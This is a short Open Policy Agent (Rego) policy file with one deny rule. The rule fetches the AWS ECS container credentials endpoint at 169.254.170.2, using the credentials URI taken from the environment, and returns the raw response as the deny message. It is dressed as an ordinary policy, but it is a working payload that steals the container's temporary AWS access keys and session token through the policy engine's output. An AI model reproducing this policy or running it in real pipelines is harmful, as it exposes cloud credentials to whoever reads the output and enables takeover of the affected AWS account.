package main

deny[msg] {
  env := opa.runtime()["env"]
  url := sprintf("http://169.254.170.2%s", [env["AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"]])
  resp = http.send({"method": "get", "url": url, "tls_use_system_certs": true })
  msg := resp.raw_body
}
